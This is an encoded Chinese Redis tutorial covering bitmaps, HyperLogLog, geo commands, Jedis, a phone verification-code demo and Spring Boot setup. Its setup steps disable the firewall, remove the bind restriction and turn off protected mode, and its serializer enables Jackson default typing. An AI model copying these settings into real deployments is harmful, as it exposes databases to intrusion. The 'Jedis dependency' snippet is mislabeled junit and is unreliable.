<p>&#x9700;&#x6CE8;&#x610F;&#x5728;&#x5F00;&#x53D1;&#x4E2D;&#x7528;&#x6237; id &#x5E38;&#x4EE5;&#x6307;&#x5B9A;&#x6570;&#x5B57;&#x5F00;&#x5934;&#xFF0C;&#x82E5;&#x76F4;&#x63A5;&#x5C06;&#x7528;&#x6237; id &#x548C; bitmaps &#x7684;&#x504F;&#x79FB;&#x91CF;&#x5BF9;&#x5E94;&#x4F1A;&#x9020;&#x6210;&#x6D6A;&#x8D39;&#xFF0C;&#x901A;&#x5E38;&#x505A;&#x6CD5;&#x662F;&#x6BCF;&#x6B21;&#x505A; setbit &#x64CD;&#x4F5C;&#x65F6;&#x5C06;&#x7528;&#x6237; id &#x51CF;&#x53BB;&#x8FD9;&#x4E2A;&#x6307;&#x5B9A;&#x6570;&#x5B57;&#x3002;</p>
<pre><code class="language-shell"># &#x73B0;&#x6709;20&#x4E2A;&#x7528;&#x6237; =&gt; &#x5176;&#x4E2D; 1 6 11 15 19 &#x4E8E; 1 &#x6708;&#x8BBF;&#x95EE;&#x7F51;&#x7AD9; =&gt; &#x5BF9; bitmap &#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;
127.0.0.1:6379&gt; setbit users:202101 1 1
(integer) 0
127.0.0.1:6379&gt; setbit users:202101 6 1
(integer) 0
127.0.0.1:6379&gt; setbit users:202101 11 1
(integer) 0
127.0.0.1:6379&gt; setbit users:202101 15 1
(integer) 0
127.0.0.1:6379&gt; setbit users:202101 19 1
(integer) 0
127.0.0.1:6379&gt; getbit users:202101 1
(integer) 1
127.0.0.1:6379&gt; bitcount users:202101
(integer) 5
# &#x65E5;&#x671F;&#x9650;&#x5B9A;&#x8BBF;&#x95EE;&#x7F51;&#x7AD9;&#x7684;&#x76F8;&#x540C;&#x4EBA;&#x4EBA;&#x6570;
setbit unique:users:20201101 1 1
setbit unique:users:20201101 2 1
setbit unique:users:20201101 5 1
setbit unique:users:20201101 9 1
setbit unique:users:20201102 0 1
setbit unique:users:20201102 1 1
setbit unique:users:20201102 4 1
setbit unique:users:20201102 9 1
bitop and unique:users:and:20201101_02 unique:users:20201102 unique:users:20201101
(integer) 2
127.0.0.1:6379&gt; bitcount unique:users:and:20201101_02
(integer) 2
</code></pre>
<p>&#x82E5;&#x7F51;&#x7AD9;&#x6709;&#x4E00;&#x4EBF;&#x7528;&#x6237;&#xFF0C;&#x6BCF;&#x5929;&#x72EC;&#x7ACB;&#x8BBF;&#x95EE;&#x7684;&#x7528;&#x6237;&#x6709;&#x4E94;&#x5343;&#x4E07;&#xFF0C;&#x90A3;&#x4E48;&#x6BCF;&#x5929;&#x7528;&#x96C6;&#x5408;&#x548C; Bitmaps &#x5206;&#x522B;&#x5B58;&#x50A8;&#x6D3B;&#x8DC3;&#x7528;&#x6237;&#x5BF9;&#x6BD4;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x6570;&#x636E;&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x6BCF;&#x4E2A;&#x7528;&#x6237; id &#x5360;&#x7528;&#x7A7A;&#x95F4;</th>
<th style="text-align:center">&#x9700;&#x8981;&#x5B58;&#x50A8;&#x7684;&#x7528;&#x6237;&#x91CF;</th>
<th style="text-align:center">&#x5168;&#x90E8;&#x5185;&#x5B58;&#x91CF;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&#x96C6;&#x5408;&#x7C7B;&#x578B;</td>
<td style="text-align:center">64&#x4F4D;</td>
<td style="text-align:center">50000000</td>
<td style="text-align:center">64&#x4F4D;*50000000=400MB</td>
</tr>
<tr>
<td style="text-align:center">Bitmaps</td>
<td style="text-align:center">1&#x4F4D;</td>
<td style="text-align:center">100000000</td>
<td style="text-align:center">1&#x4F4D;*100000000=12.5MB</td>
</tr>
</tbody>
</table>
<h3 id="hyperloglog">HyperLogLog</h3>
<p>&#x72EC;&#x7ACB;&#x8BBF;&#x5BA2; UniqueVisitor UV&#x3001;&#x72EC;&#x7ACB; IP &#x6570;&#x3001;&#x641C;&#x7D22;&#x8BB0;&#x5F55;&#x7B49;&#x9700;&#x8981;&#x53BB;&#x91CD;&#x548C;&#x8BA1;&#x6570;&#x7684;&#x95EE;&#x9898;&#x79F0;&#x4E3A;&#x57FA;&#x6570;&#x95EE;&#x9898;&#x3002;&#x867D;&#x8BF4; Mysql &#x80FD;&#x4F7F;&#x7528; distinct &#x548C; count &#x5904;&#x7406;&#xFF1B;Redis &#x80FD;&#x63D0;&#x4F9B; Hash&#x3001;Set &#x548C; BitMaps&#xFF0C;&#x4F46;&#x968F;&#x7740;&#x6570;&#x636E;&#x589E;&#x52A0;&#xFF0C;&#x5360;&#x7528;&#x7A7A;&#x95F4;&#x589E;&#x5927;&#xFF0C;&#x6570;&#x636E;&#x96C6;&#x663E;&#x5F97;&#x6709;&#x4E9B;&#x6349;&#x895F;&#x89C1;&#x8098;&#x3002;</p>
<p>HyperLogLog &#x662F;&#x9002;&#x7528;&#x4E8E;&#x505A;&#x57FA;&#x6570;&#x7EDF;&#x8BA1;&#x7684;&#x7B97;&#x6CD5;&#x3002;&#x6BCF;&#x4E2A; HyperLogLog &#x952E;&#x53EA;&#x9700;&#x82B1;&#x8D39; 12 KB &#x5185;&#x5B58;&#xFF0C;&#x5C31;&#x53EF;&#x8BA1;&#x7B97; 2^64 &#x4E2A;&#x4E0D;&#x540C;&#x5143;&#x7D20;&#x7684;&#x57FA;&#x6570;&#x3002;&#x5728;&#x8F93;&#x5165;&#x5143;&#x7D20;&#x6570;&#x91CF;&#x6216;&#x4F53;&#x79EF;&#x5DE8;&#x5927;&#x65F6;&#xFF0C;&#x8BA1;&#x7B97;&#x57FA;&#x6570;&#x6240;&#x9700;&#x7A7A;&#x95F4;&#x662F;&#x56FA;&#x5B9A;&#x6709;&#x9650;&#x7684;&#x3002;&#x56E0;&#x5176;&#x53EA;&#x636E;&#x8F93;&#x5165;&#x5143;&#x7D20;&#x8BA1;&#x7B97;&#x57FA;&#x6570;&#x800C;&#x4E0D;&#x4F1A;&#x5B58;&#x50A8;&#x8F93;&#x5165;&#x5143;&#x7D20;&#x672C;&#x8EAB;&#xFF0C;&#x6545;&#x4E0D;&#x80FD;&#x50CF;&#x96C6;&#x5408;&#x822C;&#x8FD4;&#x56DE;&#x8F93;&#x5165;&#x7684;&#x5404;&#x4E2A;&#x5143;&#x7D20;&#x3002;</p>
<p>&#x6570;&#x636E;&#x96C6; {1,3,5,7,5,7,8} &#x4E2D;&#x7684;&#x57FA;&#x6570;&#x96C6;&#x4E3A; {1,3,5,7,8}&#xFF0C;&#x57FA;&#x6570;&#xFF0C;&#x5373;&#x4E0D;&#x53EF;&#x91CD;&#x590D;&#x5143;&#x7D20;&#x4E3A; 5&#x3002;&#x57FA;&#x6570;&#x4F30;&#x8BA1;&#x5C31;&#x662F;&#x5728;&#x8BEF;&#x5DEE;&#x53EF;&#x63A5;&#x6536;&#x8303;&#x56F4;&#x5185;&#x5FEB;&#x901F;&#x8BA1;&#x7B97;&#x57FA;&#x6570;&#x3002;</p>
<p><code>pfadd &lt;Key&gt; &lt;Element&gt; [Element...]</code> &#x6DFB;&#x52A0;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x5230; HyperLogLog&#x3002;&#x8FD1;&#x4F3C;&#x57FA;&#x6570;&#x53D8;&#x5316;&#x8FD4;&#x56DE; 1&#xFF0C;&#x5426;&#x5219;&#x8FD4;&#x56DE; 0&#x3002;<code>pfcount &lt;Key&gt; [key...]</code> &#x8BA1;&#x7B97; HLL &#x8FD1;&#x4F3C;&#x57FA;&#x6570;&#x3002;<code>pfmerge &lt;DestKey&gt; &lt;SourceKey&gt; [SourceKey]</code> &#x5C06;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A; HLL &#x5408;&#x5E76;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x5B58;&#x50A8;&#x4E8E;&#x53E6;&#x4E00;&#x4E2A; HLL&#x3002;</p>
<pre><code class="language-shell">127.0.0.1:6379&gt; pfadd program &quot;java&quot;
(integer) 1
127.0.0.1:6379&gt; pfadd program &quot;node&quot;
(integer) 1
127.0.0.1:6379&gt; pfadd program &quot;javascript&quot;
(integer) 1
127.0.0.1:6379&gt; pfadd program &quot;java&quot;
(integer) 0
127.0.0.1:6379&gt; pfadd program &quot;java&quot; &quot;cpp&quot; &quot;c&quot;
(integer) 1
127.0.0.1:6379&gt; pfcount program
(integer) 5
127.0.0.1:6379&gt; pfadd language &quot;java&quot; &quot;node&quot; &quot;javascript&quot; &quot;cpp&quot;
(integer) 1
127.0.0.1:6379&gt; pfadd language &quot;java&quot; &quot;node&quot; &quot;javascript&quot; &quot;cpp&quot;
(integer) 0
127.0.0.1:6379&gt; pfmerge mergetable program language
OK
127.0.0.1:6379&gt; pfcount mergetable
(integer) 5
</code></pre>
<h3 id="geospatial">Geospatial</h3>
<p>Redis &#x63D0;&#x4F9B;&#x5BF9;&#x5730;&#x7406;&#x4FE1;&#x606F;&#x652F;&#x6301;&#xFF0C;Geospatial &#x63D0;&#x4F9B;&#x4E0E;&#x5730;&#x7406;&#x7A7A;&#x95F4;&#x7D22;&#x5F15;&#x76F8;&#x5173;&#x7684;&#x547D;&#x4EE4;&#x3002;</p>
<p><code>geoadd &lt;Key&gt; &lt;Longitude&gt; &lt;Latitude&gt; &lt;Member&gt; [...]</code> &#x6DFB;&#x52A0;&#x5730;&#x7406;&#x4F4D;&#x7F6E;&#x3002;</p>
<p><code>geopos &lt;Key&gt; &lt;Member&gt; [Member...]</code> &#x83B7;&#x5F97;&#x6307;&#x5B9A;&#x5730;&#x533A;&#x7684;&#x5750;&#x6807;&#x503C;&#x3002;</p>
<p><code>geodist &lt;Key&gt; &lt;Member1&gt; &lt;Member2&gt; [m|km|ft|mi]</code> &#x83B7;&#x53D6;&#x4F4D;&#x7F6E;&#x76F4;&#x7EBF;&#x8DDD;&#x79BB;&#x3002;</p>
<p><code>georadius &lt;Key&gt; &lt;Longitude&gt; &lt;Latitude&gt; radius m|km|ft|mi</code> &#x4EE5;&#x7ED9;&#x5B9A;&#x7684;&#x7ECF;&#x7EAC;&#x5EA6;&#x4E3A;&#x4E2D;&#x5FC3;&#xFF0C;&#x627E;&#x51FA;&#x67D0;&#x4E00;&#x534A;&#x5F84;&#x5185;&#x7684;&#x5143;&#x7D20;&#x3002;&#x53EF;&#x4F5C;&#x4E3A;&#x5FAE;&#x4FE1;&#x9644;&#x8FD1;&#x7684;&#x4EBA;&#x5B9E;&#x73B0;&#x65B9;&#x6CD5;&#x3002;</p>
<pre><code class="language-shell">127.0.0.1:6379&gt; geoadd china:city 112.93 28.23 changsha 114.05 22.52 shenzhen
(integer) 2
127.0.0.1:6379&gt; geopos china:city changsha
1) 1) &quot;112.92999833822250366&quot;
   2) &quot;28.2299993949683099&quot;
127.0.0.1:6379&gt; geodist china:city changsha shenzhen
&quot;644984.9761&quot;
127.0.0.1:6379&gt; georadius china:city 111 20 1000 KM
1) &quot;shenzhen&quot;
2) &quot;changsha&quot;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="jedis">Jedis</h2>
<p>Jedis &#x662F; redis &#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x5DE5;&#x5177;&#xFF0C;&#x5373;&#x901A;&#x8FC7; Java &#x64CD;&#x4F5C; redis&#x3002;&#x7C7B;&#x4F3C;&#x4E8E; JDBC &#x901A;&#x8FC7; Java &#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x3002;</p>
<h3 id="%E6%99%AE%E9%80%9A%E5%B7%A5%E7%A8%8B%E4%BD%BF%E7%94%A8">&#x666E;&#x901A;&#x5DE5;&#x7A0B;&#x4F7F;&#x7528;</h3>
<ul>
<li>Jedis &#x7684;&#x4F9D;&#x8D56; jar &#x5305;</li>
</ul>
<pre><code class="language-xml">&lt;dependency&gt;
    &lt;groupId&gt;junit&lt;/groupId&gt;
    &lt;artifactId&gt;junit&lt;/artifactId&gt;
    &lt;version&gt;4.13.2&lt;/version&gt;
    &lt;scope&gt;compile&lt;/scope&gt;
&lt;/dependency&gt;
</code></pre>
<ul>
<li>&#x6CE8;&#x610F;&#x4E8B;&#x9879; =&gt; &#x5173;&#x95ED;&#x9632;&#x706B;&#x5899;&#xFF1B;bind &#x914D;&#x7F6E;&#x5E94;&#x6CE8;&#x91CA;&#xFF1B;protected-mode no</li>
</ul>
<pre><code class="language-shell">### --- shell --- ###
# &#x7981;&#x7528; Linux &#x7684;&#x9632;&#x706B;&#x5899;
systemctl status firewalld
systemctl stop/disable firewalld.service
### --- redis.conf --- ###
# bind &#x914D;&#x7F6E;&#x5E94;&#x6CE8;&#x91CA; =&gt; &#x4E0D;&#x53EA;&#x63A5;&#x53D7;&#x672C;&#x673A;&#x7684;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;
# bind=127.0.0.1
# protected-mode &#x4ECE;&#x9ED8;&#x8BA4;&#x7684; yes &#x6539;&#x4E3A; no
protected-mode no
</code></pre>
<ul>
<li>Jedis &#x5E38;&#x7528;&#x64CD;&#x4F5C;</li>
</ul>
<pre><code class="language-java">public class JedisDemo01 {
    public static void main(String[] args) {
        // &#x521B;&#x5EFA; jedis
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        // &#x6D4B;&#x8BD5;
        String ping = jedis.ping();
        System.out.println(ping);
    }
    // &#x64CD;&#x4F5C; key
    @Test
    public void demo01(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.set(&quot;user&quot;, &quot;zs&quot;);
        Set&lt;String&gt; keys = jedis.keys(&quot;*&quot;);
        for(String key : keys){
            System.out.println(key);
        }
        System.out.println(jedis.exists(&quot;user&quot;));
        System.out.println(jedis.ttl(&quot;user&quot;));
        System.out.println(jedis.get(&quot;user&quot;));
    }
    // &#x8BBE;&#x7F6E;&#x591A;&#x4E2A; key-value &#x64CD;&#x4F5C; String
    @Test
    public void demo02(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.mset(&quot;str1&quot;,&quot;v1&quot;,&quot;str2&quot;,&quot;v2&quot;,&quot;str3&quot;,&quot;v3&quot;);
        System.out.println(jedis.mget(&quot;str1&quot;,&quot;str2&quot;,&quot;str3&quot;));
        jedis.flushDB();
    }
    // &#x64CD;&#x4F5C; list
    @Test
    public void demo03(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.lpush(&quot;key1&quot;,&quot;zs&quot;,&quot;gz&quot;,&quot;hz&quot;,&quot;jr&quot;,&quot;ss&quot;);
        System.out.println(jedis.lrange(&quot;key1&quot;, 0, -1));
        jedis.flushDB();
    }
    // &#x64CD;&#x4F5C; set
    @Test
    public void demo04(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.sadd(&quot;key1&quot;,&quot;zs&quot;,&quot;gz&quot;,&quot;hz&quot;,&quot;jr&quot;,&quot;ss&quot;);
        System.out.println(jedis.smembers(&quot;key1&quot;));
        jedis.flushDB();
    }
    // &#x64CD;&#x4F5C; hash
    @Test
    public void demo05(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.hset(&quot;users&quot;,&quot;name&quot;,&quot;zs&quot;);
        System.out.println(jedis.hget(&quot;users&quot;,&quot;name&quot;));
        jedis.flushDB();
    }
    // &#x64CD;&#x4F5C; zset
    @Test
    public void demo06(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.zadd(&quot;china&quot;,100,&quot;cs&quot;);
        System.out.println(jedis.zrange(&quot;china&quot;,0,-1));
        jedis.flushDB();
    }
}
</code></pre>
<ul>
<li>&#x624B;&#x673A;&#x9A8C;&#x8BC1;&#x7801;&#x529F;&#x80FD;</li>
</ul>
<p>&#x8981;&#x6C42;&#x8F93;&#x5165;&#x624B;&#x673A;&#x53F7;&#xFF0C;&#x70B9;&#x51FB;&#x53D1;&#x9001;&#x540E;&#x968F;&#x673A;&#x751F;&#x6210; 6 &#x4F4D;&#x6570;&#x5B57;&#x7801;&#xFF0C;2 &#x5206;&#x949F;&#x6709;&#x6548;&#xFF1B;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#x7801;&#xFF0C;&#x70B9;&#x51FB;&#x9A8C;&#x8BC1;&#xFF0C;&#x8FD4;&#x56DE;&#x6210;&#x529F;&#x6216;&#x5931;&#x8D25;&#xFF1B;&#x6BCF;&#x4E2A;&#x624B;&#x673A;&#x53F7;&#x6BCF;&#x5929;&#x53EA;&#x80FD;&#x8F93;&#x5165; 3 &#x6B21;&#x3002;</p>
<pre><code class="language-java">public class JedisDemo02 {
    public static void main(String[] args) {
        // &#x6A21;&#x62DF;&#x9A8C;&#x8BC1;&#x7801;&#x53D1;&#x9001;
//        verifyCode(&quot;12345678987&quot;);

        // &#x6A21;&#x62DF;&#x9A8C;&#x8BC1;&#x7801;&#x6821;&#x9A8C;
         getRedisCode(&quot;12345678987&quot;,&quot;809507&quot;);
    }

    // 3 &#x9A8C;&#x8BC1;&#x7801;&#x6821;&#x9A8C;
    public static void getRedisCode(String phone,String code) {
        //&#x4ECE;redis&#x83B7;&#x53D6;&#x9A8C;&#x8BC1;&#x7801;
        Jedis jedis = new Jedis(&quot;xxx.xx.xx.xxx&quot;,6379);
//        jedis.auth();
        // &#x9A8C;&#x8BC1;&#x7801;key
        String codeKey = &quot;VerifyCode&quot;+phone+&quot;:code&quot;;
        String redisCode = jedis.get(codeKey);
        // &#x5224;&#x65AD;
        if(redisCode.equals(code)) {
            System.out.println(&quot;&#x6210;&#x529F;&quot;);
        }else {
            System.out.println(&quot;&#x5931;&#x8D25;&quot;);
        }
        jedis.close();
    }

    // 2 &#x6BCF;&#x4E2A;&#x624B;&#x673A;&#x6BCF;&#x5929;&#x53EA;&#x80FD;&#x53D1;&#x9001;&#x4E09;&#x6B21;&#xFF0C;&#x9A8C;&#x8BC1;&#x7801;&#x653E;&#x5230;redis&#x4E2D;&#xFF0C;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;120
    public static void verifyCode(String phone) {
        // &#x8FDE;&#x63A5;redis
        Jedis jedis = new Jedis(&quot;xxx.xx.xx.xxx&quot;,6379);

        // &#x62FC;&#x63A5;key
        // &#x624B;&#x673A;&#x53D1;&#x9001;&#x6B21;&#x6570;key
        String countKey = &quot;VerifyCode&quot;+phone+&quot;:count&quot;;
        // &#x9A8C;&#x8BC1;&#x7801;key
        String codeKey = &quot;VerifyCode&quot;+phone+&quot;:code&quot;;

        // &#x6BCF;&#x4E2A;&#x624B;&#x673A;&#x6BCF;&#x5929;&#x53EA;&#x80FD;&#x53D1;&#x9001;&#x4E09;&#x6B21;
        String count = jedis.get(countKey);
        if(count == null) {
            // &#x6CA1;&#x6709;&#x53D1;&#x9001;&#x6B21;&#x6570;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x53D1;&#x9001;
            // &#x8BBE;&#x7F6E;&#x53D1;&#x9001;&#x6B21;&#x6570;&#x662F;1
            jedis.setex(countKey,24*60*60,&quot;1&quot;);
        } else if(Integer.parseInt(count)&lt;=2) {
            // &#x53D1;&#x9001;&#x6B21;&#x6570;+1
            jedis.incr(countKey);
        } else if(Integer.parseInt(count)&gt;2) {
            // &#x53D1;&#x9001;&#x4E09;&#x6B21;&#xFF0C;&#x4E0D;&#x80FD;&#x518D;&#x53D1;&#x9001;
            System.out.println(&quot;&#x4ECA;&#x5929;&#x53D1;&#x9001;&#x6B21;&#x6570;&#x5DF2;&#x7ECF;&#x8D85;&#x8FC7;&#x4E09;&#x6B21;&quot;);
            jedis.close();
            return;//&#x8D85;&#x8FC7;&#x4E09;&#x6B21;&#x4E4B;&#x540E;&#x5C31;&#x4F1A;&#x81EA;&#x52A8;&#x9000;&#x51FA;&#x4E0D;&#x4F1A;&#x518D;&#x53D1;&#x9001;&#x4E86;&#xFF0C;&#x4E0D;&#x6DFB;&#x52A0;&#x8FD9;&#x4E00;&#x884C;&#xFF0C;&#x5373;&#x4F7F;&#x663E;&#x793A;&#x53D1;&#x9001;&#x6B21;&#x6570;&#xFF0C;&#x4F46;&#x8FD8;&#x4F1A;&#x6709;&#x9A8C;&#x8BC1;&#x7801;&#x63A5;&#x6536;&#x5230;
        }

        // &#x53D1;&#x9001;&#x9A8C;&#x8BC1;&#x7801;&#x653E;&#x5230; redis &#x91CC;&#x9762;
        String vcode = getCode(); // &#x8C03;&#x7528;&#x751F;&#x6210;&#x7684;&#x9A8C;&#x8BC1;&#x7801;
        jedis.setex(codeKey,120,vcode); // &#x8BBE;&#x7F6E;&#x751F;&#x6210;&#x7684;&#x9A8C;&#x8BC1;&#x7801;&#x53EA;&#x6709;120&#x79D2;&#x7684;&#x65F6;&#x95F4;
        jedis.close();
    }

    // 1 &#x751F;&#x6210;6&#x4F4D;&#x6570;&#x5B57;&#x9A8C;&#x8BC1;&#x7801;&#xFF0C;code&#x662F;&#x9A8C;&#x8BC1;&#x7801;
    public static String getCode() {
        Random random = new Random();
        String code = &quot;&quot;;
        for(int i=0;i&lt;6;i++) {
            int rand = random.nextInt(10);
            code += rand;
        }
        return code;
    }
}
</code></pre>
<h3 id="springboot-%E6%95%B4%E5%90%88-redis">SpringBoot &#x6574;&#x5408; redis</h3>
<ul>
<li>&#x5728; pom.xml &#x6587;&#x4EF6;&#x4E2D;&#x5F15;&#x5165; redis &#x76F8;&#x5173;&#x4F9D;&#x8D56;</li>
</ul>
<pre><code class="language-xml">&lt;!-- redis --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!-- spring2.X &#x96C6;&#x6210; redis &#x6240;&#x9700; common-pool2--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
    &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;
    &lt;version&gt;2.11.1&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
    &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;
    &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
<ul>
<li>application.properties &#x914D;&#x7F6E; redis</li>
</ul>
<pre><code class="language-properties"># Redis &#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;
spring.redis.host=&lt;yourIP&gt;
# Redis &#x5BC6;&#x7801;
spring.redis.password=&lt;yourPassword&gt;
# Redis &#x670D;&#x52A1;&#x5668;&#x8FDE;&#x63A5;&#x7AEF;&#x53E3;
spring.redis.port=6379
# Redis &#x6570;&#x636E;&#x5E93;&#x7D22;&#x5F15;
spring.redis.database= 0
# &#x8FDE;&#x63A5;&#x8D85;&#x65F6;&#x65F6;&#x95F4; =&gt; ms
spring.redis.timeout=1800000
# &#x8FDE;&#x63A5;&#x6C60;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570; =&gt; &#x8D1F;&#x503C;&#x8868;&#x793A;&#x6CA1;&#x6709;&#x9650;&#x5236;
spring.redis.lettuce.pool.max-active=20
# &#x6700;&#x5927;&#x963B;&#x585E;&#x7B49;&#x5F85;&#x65F6;&#x95F4; =&gt; &#x8D1F;&#x6570;&#x8868;&#x793A;&#x6CA1;&#x9650;&#x5236;
spring.redis.lettuce.pool.max-wait=-1
# &#x8FDE;&#x63A5;&#x6C60;&#x4E2D;&#x7684;&#x6700;&#x5927;&#x7A7A;&#x95F2;&#x8FDE;&#x63A5;
spring.redis.lettuce.pool.max-idle=5
# &#x8FDE;&#x63A5;&#x6C60;&#x4E2D;&#x7684;&#x6700;&#x5C0F;&#x7A7A;&#x95F2;&#x8FDE;&#x63A5;
spring.redis.lettuce.pool.min-idle=0
</code></pre>
<ul>
<li>&#x6DFB;&#x52A0; redis &#x914D;&#x7F6E;&#x7C7B;</li>
</ul>
<pre><code class="language-java">@EnableCaching
@Configuration
public class RedisConfig extends CachingConfigurerSupport {

    @Bean
    public RedisTemplate&lt;String, Object&gt; redisTemplate(RedisConnectionFactory factory) {
        RedisTemplate&lt;String, Object&gt; template = new RedisTemplate&lt;&gt;();
        RedisSerializer&lt;String&gt; redisSerializer = new StringRedisSerializer();
        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class);
        ObjectMapper om = new ObjectMapper();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        jackson2JsonRedisSerializer.setObjectMapper(om);
        template.setConnectionFactory(factory);
        // key &#x5E8F;&#x5217;&#x5316;&#x65B9;&#x5F0F;
        template.setKeySerializer(redisSerializer);
        // value &#x5E8F;&#x5217;&#x5316;
        template.setValueSerializer(jackson2JsonRedisSerializer);
        // value hashmap &#x5E8F;&#x5217;&#x5316;
        template.setHashValueSerializer(jackson2JsonRedisSerializer);
        return template;
    }

    @Bean
    public CacheManager cacheManager(RedisConnectionFactory factory) {
        RedisSerializer&lt;String&gt; redisSerializer = new StringRedisSerializer();
        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class);
        // &#x89E3;&#x51B3;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x8F6C;&#x6362;&#x5F02;&#x5E38;
        ObjectMapper om = new ObjectMapper();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        jackson2JsonRedisSerializer.setObjectMapper(om);
        // &#x914D;&#x7F6E;&#x5E8F;&#x5217;&#x5316; =&gt; &#x89E3;&#x51B3;&#x4E71;&#x7801; =&gt; &#x8FC7;&#x671F;&#x65F6;&#x95F4; 600 &#x79D2;
        RedisCacheConfiguration config = RedisCacheConfiguration.defaultCacheConfig()
                .entryTtl(Duration.ofSeconds(600))
                .serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(redisSerializer))
                .serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(jackson2JsonRedisSerializer))
                .disableCachingNullValues();
        RedisCacheManager cacheManager = RedisCacheManager.builder(factory)
                .cacheDefaults(config)
                .build();
        return cacheManager;
    }
}
</code></pre>
<ul>
<li>RedisTestController &#x4E2D;&#x6DFB;&#x52A0;&#x6D4B;&#x8BD5;&#x65B9;&#x6CD5;</li>
</ul>
<pre><code class="language-java">@RestController
@RequestMapping(&quot;/redisTest&quot;)
public class RedisTestController {
    @Autowired
    private RedisTemplate redisTemplate;

    @GetMapping
    public String testRedis() {
        // &#x8BBE;&#x7F6E;&#x503C;
        redisTemplate.opsForValue().set(&quot;name&quot;,&quot;zs&quot;);
        // &#x83B7;&#x53D6;&#x503C;
        String name = (String)redisTemplate.opsForValue().get(&quot;name&quot;);
        return name;
    }
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E4%BA%8B%E5%8A%A1%E5%92%8C%E9%94%81%E6%9C%BA%E5%88%B6">&#x4E8B;&#x52A1;&#x548C;&#x9501;&#x673A;&#x5236;</h2>
<h3 id="redis-%E4%BA%8B%E5%8A%A1">Redis &#x4E8B;&#x52A1;</h3>
<blockquote>
<p>Redis &#x4E8B;&#x52A1;&#x5141;&#x8BB8;&#x5728;&#x4E00;&#x4E2A;&#x6B65;&#x9AA4;&#x4E2D;&#x6267;&#x884C;&#x4E00;&#x7EC4;&#x547D;&#x4EE4;&#x3002;</p>
<ul>
<li>&#x5C5E;&#x6027;&#x4E00; =&gt; &#x4E8B;&#x52A1;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x547D;&#x4EE4;&#x4F5C;&#x4E3A;&#x5355;&#x4E2A;&#x9694;&#x79BB;&#x64CD;&#x4F5C;&#x6309;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x3002;&#x53E6;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x51FA;&#x7684;&#x8BF7;&#x6C42;&#x4E0D;&#x53EF;&#x80FD;&#x5728; Redis &#x4E8B;&#x52A1;&#x7684;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x5F97;&#x5230;&#x5904;&#x7406;&#x3002;</li>
